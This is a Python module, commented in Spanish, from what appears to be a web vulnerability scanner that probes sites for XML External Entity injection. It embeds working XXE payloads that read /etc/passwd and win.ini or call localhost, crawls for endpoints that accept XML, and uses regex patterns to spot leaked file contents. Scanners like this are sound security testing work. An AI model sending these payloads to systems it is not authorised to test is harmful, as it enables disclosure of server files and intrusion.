"""
Módulo de detección de XXE (XML External Entity).
Detecta vulnerabilidades de inyección de entidades externas XML.
MIGRADO a EnhancedVulnerabilityModule - 45% menos código.
"""
import re
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from core.enhanced_base_module import EnhancedVulnerabilityModule


class XXEModule(EnhancedVulnerabilityModule):
    """Detecta vulnerabilidades XXE (XML External Entity) en aplicaciones web."""
    
    # Payloads XXE
    BASIC_PAYLOADS = [
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',
        
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',
        
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80">]>
<root><data>&xxe;</data></root>''',
    ]
    
    # Patrones de evidencia XXE
    XXE_EVIDENCE_PATTERNS = [
        r'root:.*:0:0:',
        r'/bin/bash',
        r'\[fonts\]',
        r'\[extensions\]',
        r'for 16-bit app support',
        r'XML.*?parsing.*?error',
        r'External entity',
    ]

    def __init__(self, config):
        super().__init__(config)
        # HTTPClient, PayloadManager, logger ya disponibles
        self.tested_endpoints = set()

    def scan(self):
        """Ejecuta el escaneo completo de XXE."""
        self.logger.info(f"[XXE] Iniciando escaneo de XXE en: {self.target_url}")
        
        try:
            # 1. Detectar endpoints que aceptan XML
            xml_endpoints = self._discover_xml_endpoints()
            
            if not xml_endpoints:
                self.logger.warning("[XXE] No se encontraron endpoints que acepten XML")
                return
            
            self.logger.info(f"[XXE] Encontrados {len(xml_endpoints)} endpoints XML")
            
            # 2. Probar XXE en cada endpoint
            self._test_xxe_injection(xml_endpoints)
            
            # 3. Exportar resultados (método heredado)
            self._export_results()
            
            critical = len([f for f in self.findings if f["severity"] == "critical"])
            high = len([f for f in self.findings if f["severity"] == "high"])
            
            self.logger.info(f"[XXE] Escaneo completado: {len(self.findings)} hallazgos")
            self.logger.info(f"[XXE] Severidad: Critical={critical}, High={high}")
            
        except Exception as e:
            self.logger.error(f"[XXE] Error inesperado: {e}")

    def _discover_xml_endpoints(self):
        """Descubre endpoints que aceptan XML."""
        xml_endpoints = []
        
        try:
            # Hacer request (método heredado)
            response = self._make_request(self.target_url)
            if not response:
                return xml_endpoints
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 1. Buscar formularios que puedan aceptar XML
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'post').upper()
                action_url = urljoin(self.target_url, action) if action else self.target_url
                
                if any(keyword in action_url.lower() for keyword in ['xml', 'api', 'soap', 'upload']):
                    xml_endpoints.append({
                        'url': action_url,
                        'method': method,
                        'type': 'form'
                    })
            
            # 2. Endpoints comunes de API
            common_api_paths = ['/api/xml', '/upload', '/import', '/soap', '/xmlrpc']
            
            parsed = urlparse(self.target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            for path in common_api_paths:
                test_url = urljoin(base_url, path)
                xml_endpoints.append({
                    'url': test_url,
                    'method': 'POST',
                    'type': 'api'
                })
            
            # 3. Si la URL actual parece ser un endpoint XML
            if any(keyword in self.target_url.lower() for keyword in ['xml', 'api', 'soap']):
                xml_endpoints.append({
                    'url': self.target_url,
                    'method': 'POST',
                    'type': 'direct'
                })
            
            self.logger.info(f"[XXE] Descubiertos {len(xml_endpoints)} endpoints XML potenciales")
            
        except Exception as e:
            self.logger.error(f"[XXE] Error descubriendo endpoints XML: {e}")
        
        return xml_endpoints

    def _test_xxe_injection(self, xml_endpoints):
        """Prueba XXE injection en los endpoints."""
        self.logger.info("[XXE] Probando XXE injection...")
        
        for endpoint in xml_endpoints:
            endpoint_key = f"{endpoint['url']}:{endpoint['method']}"
            if endpoint_key in self.tested_endpoints:
                continue
            self.tested_endpoints.add(endpoint_key)
            
            # Verificar si el endpoint acepta XML
            if not self._accepts_xml(endpoint):
                continue
            
            for payload in self.BASIC_PAYLOADS:
                try:
                    # Enviar payload XXE
                    headers = {
                        'Content-Type': 'application/xml',
                        'Accept': 'application/xml, text/xml, */*'
                    }
                    
                    response = self._make_request(
                        endpoint['url'],
                        method=endpoint['method'],
                        data=payload,
                        headers=headers
                    )
                    
                    if not response:
                        continue
                    
                    # CRÍTICO: Verificar que no sea página de error 404
                    if response.status_code == 404:
                        self.logger.debug(f"[XXE] Endpoint {endpoint['url']} devuelve 404")
                        break
                    
                    # CRÍTICO: Verificar que no sea página de error HTML genérica
                    if self._is_html_error_page(response.text):
                        self.logger.debug(f"[XXE] Endpoint {endpoint['url']} devuelve página de error HTML")
                        break
                    
                    # Verificar evidencia de XXE
                    evidence = self._detect_xxe_evidence(response.text)
                    
                    if evidence and self._is_real_xxe_evidence(evidence, response.text):
                        severity = "critical" if "passwd" in payload or "win.ini" in payload else "high"
                        
                        # Añadir hallazgo (método heredado)
                        self._add_finding(
                            vulnerability=f"XXE (XML External Entity) en {endpoint['url']}",
                            severity=severity,
                            url=endpoint['url'],
                            payload=payload[:200] + "..." if len(payload) > 200 else payload,
                            details={
                                "method": endpoint['method'],
                                "evidence_found": evidence,
                                "response_snippet": self._get_context_snippet(response.text, evidence),
                                "status_code": response.status_code,
                                "cvss": 9.1 if severity == "critical" else 7.5,
                                "cwe": "CWE-611",
                                "owasp": "A05:2021 - Security Misconfiguration",
                                "recommendation": "Deshabilitar el procesamiento de entidades externas en el parser XML. Usar configuraciones seguras.",
                                "references": [
                                    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
                                ]
                            }
                        )
                        
                        self.logger.warning(f"[XXE] XXE encontrado: {endpoint['url']}")
                        break
                    
                    time.sleep(0.2)
                    
                except Exception as e:
                    self.logger.debug(f"[XXE] Error probando {endpoint['url']}: {e}")

    def _accepts_xml(self, endpoint):
        """Verifica si el endpoint acepta XML."""
        try:
            simple_xml = '<?xml version="1.0"?><root><test>data</test></root>'
            headers = {
                'Content-Type': 'application/xml',
                'Accept': 'application/xml, text/xml, */*'
            }
            
            response = self._make_request(
                endpoint['url'],
                method=endpoint['method'],
                data=simple_xml,
                headers=headers
            )
            
            if not response:
                return False
            
            # Si devuelve 415 (Unsupported Media Type) o 404, no acepta XML
            if response.status_code in [415, 404]:
                return False
            
            # Si devuelve página de error HTML, probablemente no acepta XML
            if self._is_html_error_page(response.text):
                return False
            
            return True
            
        except Exception as e:
            self.logger.debug(f"[XXE] Error verificando XML en {endpoint['url']}: {e}")
        
        return False
    
    def _is_html_error_page(self, text):
        """Detecta si es una página de error HTML genérica."""
        if not text:
            return False
        
        error_indicators = [
            r'<!DOCTYPE html>.*?(404|not found|error)',
            r'<html.*?>.*?(404|not found)',
            r'__next',
            r'vercel',
        ]
        
        if not re.search(r'<!DOCTYPE html>|<html', text, re.IGNORECASE):
            return False
        
        for pattern in error_indicators:
            if re.search(pattern, text, re.IGNORECASE | re.DOTALL):
                return True
        
        return False
    
    def _is_real_xxe_evidence(self, evidence, response_text):
        """Verifica si la evidencia es realmente de XXE."""
        if evidence == '<html':
            return False
        
        real_evidence_patterns = [
            r'root:.*:0:0:',
            r'/bin/bash',
            r'/bin/sh',
            r'\[fonts\]',
            r'for 16-bit app support',
            r'\[extensions\]',
        ]
        
        for pattern in real_evidence_patterns:
            if re.search(pattern, response_text):
                return True
        
        return False

    def _detect_xxe_evidence(self, response_text):
        """Detecta evidencia de XXE en la respuesta."""
        for pattern in self.XXE_EVIDENCE_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None
